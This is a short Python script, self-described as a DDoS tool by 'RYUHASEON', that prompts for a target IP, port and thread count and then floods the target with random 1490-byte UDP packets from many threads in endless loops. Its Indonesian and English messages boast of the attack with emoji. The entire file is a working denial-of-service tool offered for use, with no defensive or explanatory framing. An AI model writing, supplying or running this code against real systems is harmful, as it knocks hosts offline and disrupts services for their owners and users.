import socket, threading, random, os
os.system("clear")
print("TOOLS DDOS BY RYUHASEON 🚀💥👿")
ip = input("IP Target: ")
port = int(input("Port: "))
threads = int(input("Threads: "))

def attack():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    while True:
        s.sendto(bytes, (ip, port))

for i in range(threads):
    threading.Thread(target=attack).start()
print(f"🚀 Serangan ke {ip}:{port} dengan {threads} threads this is ryu 😈🔥💥")
